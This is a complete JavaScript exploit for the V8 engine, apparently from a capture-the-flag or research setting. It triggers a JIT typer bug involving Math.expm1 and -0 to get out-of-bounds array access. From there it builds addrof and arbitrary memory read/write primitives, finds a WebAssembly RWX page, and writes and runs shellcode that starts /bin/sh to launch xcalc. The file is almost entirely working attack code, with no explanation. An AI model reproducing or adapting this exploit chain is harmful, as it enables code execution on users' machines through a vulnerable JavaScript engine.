class convert
{
    constructor()
    {
        this.buf=new ArrayBuffer(8)
        this.uint8array=new Uint8Array(this.buf);
        this.float64array=new Float64Array(this.buf);
        this.uint32array=new Uint32Array(this.buf);
        this.bitint=new BigUint64Array(this.buf);
    }
    f2i(x)//float64 ==> uint64
    {
        this.float64array[0]=x;
        return this.bitint[0];
    }
    i2f(x)
    {
        this.bitint[0]=BigInt(x);
        return this.float64array[0];
    }
}
let conv = new convert();
let arrs= new Array();
let bufs= new Array();
let objs= new Array();
function foo(x)
{
    let o = {mz:-0};
    let a = [0.1 , 0.2 , 0.3 , 0.4];
    let b = Object.is(Math.expm1(x),o.mz);
    arrs.push([0.4,0.5]);
    objs.push({mark:0x41414141,obj:{}});
    bufs.push(new ArrayBuffer(0x41));

    


    for(let i = 4 ; i< 200 ;i++)
    {
        let len = conv.f2i(a[i*b]);
        let is_backing = a[b*(i+1)] === 0.4;
        //console.log(len.toString(16));
        let good= (len == 0x200000000n && !is_backing);
        //if(good)
        // if(good)
        // {
        //     print("================================================>good:"+good);
        //     print("================================================>i:"+i);
        //     print("================================================>b:"+b);
            
        //     %DebugPrint(arrs[10001]);
        //     %DebugPrint(a);
        //     // %DebugPrint(arrs[0]);
        //     // %DebugPrint(b);
        //     %DebugPrint(bufs[0]);


        // }
        a[b*i*good] = conv.i2f(0x9999999200000000n);
    }
}



/*
foo(0);
%OptimizeFunctionOnNextCall(foo);
foo("0");
%OptimizeFunctionOnNextCall(foo);
foo(-0);
*/
foo(0);
for(let i = 0 ; i< 10000 ; i++)
{
    console.log("times "+(i+1));
    foo("0");
}
foo(-0);
%SystemBreak();

// %DebugPrint(bufs[2]);
// readline();
//%SystemBreak();
let oob;
let obj;
let buf;
for(let i = 0 ; i< arrs.length ; i++)
{
    if(arrs[i].length != 2){
        oob = arrs[i];
        obj = objs[i];
        buf = bufs[i];
        break;
    }
}



let offset_obj;
for(let i = 0 ;i < 40 ; i++ ){
    let temp = conv.f2i(oob[i]);
    if(temp == 0x4141414100000000)
    {
        offset_obj = i+1;
        break;
    }
}

function addrof(x)
{
    obj.obj=x;
    return conv.f2i(oob[offset_obj]);
}

let buf_backing_offset;

for(let i = 0 ; i < 50 ; i++)
{
    let temp = conv.f2i(oob[i]);
    if(temp == 0x41)
    {
        oob[i]=conv.i2f(0x8);
        buf_backing_offset=i+1;
        break;
    }
}
console.log(buf_backing_offset);
function read(addr)
{
    oob[buf_backing_offset]=conv.i2f(addr);
    let bigint=new BigUint64Array(buf);
    return bigint[0];
}

function write(addr,x)
{
    oob[buf_backing_offset] = conv.i2f(addr);
    let byte=new Uint8Array(buf);
    byte[0]=x;
}

console.log(offset_obj);


// %DebugPrint(oob);
%DebugPrint(obj);
// %DebugPrint(buf);
// %SystemBreak();

// readline();


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
%DebugPrint(f);
let f_addr = addrof(f) - 1n;
console.log("f_addr ==> 0x"+f_addr.toString(16));
let share_info_addr = read(f_addr + 0x18n) - 1n;
console.log("share_info ==> 0x"+share_info_addr.toString(16));
let wasm = read(share_info_addr + 8n) - 1n;
console.log("wasm ==> 0x"+wasm.toString(16));
let instance=read(wasm+0x10n) -1n;
console.log("instance ==> 0x"+instance.toString(16));
let rwx_addr=read(instance+0xe8n)
console.log("rwx_addr ==> 0x"+rwx_addr.toString(16));
// %SystemBreak();

shellcode =[72,49,210,82,72,141,61,48,0,0,0,87,72,141,61,37,0,0,0,87,72,141,61,21,0,0,0,87,72,141,52,36,72,141,61,9,0,0,0,72,199,192,59,0,0,0,15,5,47,98,105,110,47,115,104,0,45,99,0,101,120,112,111,114,116,32,68,73,83,80,76,65,89,61,58,48,46,48,59,120,99,97,108,99,0]
for(let i = 0 ; i< shellcode.length ; i++)
{
    write(rwx_addr+BigInt(i),shellcode[i]);
}
//%SystemBreak();

f();